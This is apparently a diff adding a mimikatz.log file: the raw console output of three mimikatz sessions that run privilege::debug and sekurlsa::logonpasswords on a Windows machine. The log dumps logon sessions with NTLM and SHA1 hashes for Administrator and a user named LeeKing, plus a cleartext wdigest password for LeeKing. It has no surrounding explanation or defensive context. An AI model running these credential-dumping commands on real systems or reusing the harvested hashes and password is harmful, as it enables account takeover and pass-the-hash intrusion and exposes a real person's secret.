@@ -1,0 +1,356 @@
+Using 'mimikatz.log' for logfile : OK
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 145542 (00000000:00023886)
+Session           : Interactive from 1
+User Name         : Administrator
+Domain            : WQ-20160909MBPX
+Logon Server      : WQ-20160909MBPX
+Logon Time        : 2016/12/23 1:16:34
+SID               : S-1-5-21-2424288739-4243578822-2583231171-500
+	msv :	
+	 [00010000] CredentialKeys
+	 * NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0
+	 * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709
+	 [00000003] Primary
+	 * Username : Administrator
+	 * Domain   : WQ-20160909MBPX
+	 * NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0
+	 * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709
+	tspkg :	
+	wdigest :	
+	 * Username : Administrator
+	 * Domain   : WQ-20160909MBPX
+	 * Password : (null)
+	kerberos :	
+	 * Username : Administrator
+	 * Domain   : WQ-20160909MBPX
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 2016/12/23 1:16:29
+SID               : S-1-5-19
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : WQ-20160909MBPX$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 2016/12/23 1:16:29
+SID               : S-1-5-20
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : WQ-20160909MBPX$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	 * Username : wq-20160909mbpx$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 40701 (00000000:00009efd)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 2016/12/23 1:16:28
+SID               : 
+	msv :	
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : WQ-20160909MBPX$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 2016/12/23 1:16:28
+SID               : S-1-5-18
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : WQ-20160909MBPX$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	 * Username : wq-20160909mbpx$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+mimikatz # Using 'mimikatz.log' for logfile : OK
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 145542 (00000000:00023886)
+Session           : Interactive from 1
+User Name         : Administrator
+Domain            : WQ-20160909MBPX
+Logon Server      : WQ-20160909MBPX
+Logon Time        : 2016/12/23 1:16:34
+SID               : S-1-5-21-2424288739-4243578822-2583231171-500
+	msv :	
+	 [00010000] CredentialKeys
+	 * NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0
+	 * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709
+	 [00000003] Primary
+	 * Username : Administrator
+	 * Domain   : WQ-20160909MBPX
+	 * NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0
+	 * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709
+	tspkg :	
+	wdigest :	
+	 * Username : Administrator
+	 * Domain   : WQ-20160909MBPX
+	 * Password : (null)
+	kerberos :	
+	 * Username : Administrator
+	 * Domain   : WQ-20160909MBPX
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 2016/12/23 1:16:29
+SID               : S-1-5-19
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : WQ-20160909MBPX$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 2016/12/23 1:16:29
+SID               : S-1-5-20
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : WQ-20160909MBPX$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	 * Username : wq-20160909mbpx$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 40701 (00000000:00009efd)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 2016/12/23 1:16:28
+SID               : 
+	msv :	
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : WQ-20160909MBPX$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 2016/12/23 1:16:28
+SID               : S-1-5-18
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : WQ-20160909MBPX$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	 * Username : wq-20160909mbpx$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+mimikatz # Using 'mimikatz.log' for logfile : OK
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 5379788 (00000000:005216cc)
+Session           : Interactive from 2
+User Name         : LeeKing
+Domain            : WQ-20160909MBPX
+Logon Server      : WQ-20160909MBPX
+Logon Time        : 2016/12/23 2:47:44
+SID               : S-1-5-21-2424288739-4243578822-2583231171-1000
+	msv :	
+	 [00010000] CredentialKeys
+	 * NTLM     : 31772f97602a8792b69cd9134cb471bd
+	 * SHA1     : 1e3a31723f3003e6cfadad532e4ba281ef52881c
+	 [00000003] Primary
+	 * Username : LeeKing
+	 * Domain   : WQ-20160909MBPX
+	 * NTLM     : 31772f97602a8792b69cd9134cb471bd
+	 * SHA1     : 1e3a31723f3003e6cfadad532e4ba281ef52881c
+	tspkg :	
+	wdigest :	
+	 * Username : LeeKing
+	 * Domain   : WQ-20160909MBPX
+	 * Password : 206419lhk
+	kerberos :	
+	 * Username : LeeKing
+	 * Domain   : WQ-20160909MBPX
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 145542 (00000000:00023886)
+Session           : Interactive from 1
+User Name         : Administrator
+Domain            : WQ-20160909MBPX
+Logon Server      : WQ-20160909MBPX
+Logon Time        : 2016/12/23 1:16:34
+SID               : S-1-5-21-2424288739-4243578822-2583231171-500
+	msv :	
+	 [00010000] CredentialKeys
+	 * NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0
+	 * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709
+	 [00000003] Primary
+	 * Username : Administrator
+	 * Domain   : WQ-20160909MBPX
+	 * NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0
+	 * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709
+	tspkg :	
+	wdigest :	
+	 * Username : Administrator
+	 * Domain   : WQ-20160909MBPX
+	 * Password : (null)
+	kerberos :	
+	 * Username : Administrator
+	 * Domain   : WQ-20160909MBPX
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 997 (00000000:000003e5)
+Session           : Service from 0
+User Name         : LOCAL SERVICE
+Domain            : NT AUTHORITY
+Logon Server      : (null)
+Logon Time        : 2016/12/23 1:16:29
+SID               : S-1-5-19
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	kerberos :	
+	 * Username : (null)
+	 * Domain   : (null)
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 996 (00000000:000003e4)
+Session           : Service from 0
+User Name         : WQ-20160909MBPX$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 2016/12/23 1:16:29
+SID               : S-1-5-20
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : WQ-20160909MBPX$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	 * Username : wq-20160909mbpx$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 40701 (00000000:00009efd)
+Session           : UndefinedLogonType from 0
+User Name         : (null)
+Domain            : (null)
+Logon Server      : (null)
+Logon Time        : 2016/12/23 1:16:28
+SID               : 
+	msv :	
+	tspkg :	
+	wdigest :	
+	kerberos :	
+	ssp :	
+	credman :	
+
+Authentication Id : 0 ; 999 (00000000:000003e7)
+Session           : UndefinedLogonType from 0
+User Name         : WQ-20160909MBPX$
+Domain            : WORKGROUP
+Logon Server      : (null)
+Logon Time        : 2016/12/23 1:16:28
+SID               : S-1-5-18
+	msv :	
+	tspkg :	
+	wdigest :	
+	 * Username : WQ-20160909MBPX$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	kerberos :	
+	 * Username : wq-20160909mbpx$
+	 * Domain   : WORKGROUP
+	 * Password : (null)
+	ssp :	
+	credman :	
+
+mimikatz # 
